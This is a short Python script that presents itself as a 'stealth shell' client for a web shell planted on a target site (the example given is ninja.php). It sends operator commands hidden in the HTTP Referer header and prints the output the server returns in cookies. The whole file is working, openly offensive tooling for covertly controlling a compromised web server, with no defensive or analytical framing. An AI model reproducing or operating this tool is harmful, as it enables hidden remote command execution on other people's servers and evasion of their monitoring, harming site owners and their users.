import requests
from urllib.parse import unquote
from urllib.parse import urlparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


print(bcolors.WARNING + '''                                 
                    ,--,,-.----.    
  ,----..         ,--.'|\    /  \   
 /   /   \     ,--,  | :|   :    \  
|   :     : ,---.'|  : '|   |  .\ : 
.   |  ;. / |   | : _' |.   :  |: | 
.   ; /--`  :   : |.'  ||   |   \ : 
;   | ;  __ |   ' '  ; :|   : .   / 
|   : |.' .''   |  .'. |;   | |`-'  
.   | '_.' :|   | :  | '|   | ;     
'   ; : \  |'   : |  : ;:   ' |     
'   | '/  .'|   | '  ,/ :   : :     
|   :    /  ;   : ;--'  |   | :     
 \   \ .'   |   ,/      `---'.|     
  `---`     '---'         `---`     
  
  stealth shell
''' + bcolors.ENDC)

def main():
    print("")
    cmd = input(bcolors.WARNING + "bloostealth@" + domain + bcolors.ENDC + " :" + bcolors.OKBLUE + "~" + bcolors.ENDC + "$ ")
    if cmd == "su":
        print("")
        print(bcolors.WARNING + "Bloos3rpent > You Need to BackConnect First!" + bcolors.ENDC)
        main()
    else :
        r=requests.get(target, headers={"Referer":cmd})
        for c in r.cookies:
            print(unquote(c.value))
        main()


target = input("Target site (http://xxxxx.com/ninja.php) > ")
parsed_uri = urlparse(target)
domain = '{uri.netloc}'.format(uri=parsed_uri)
main()
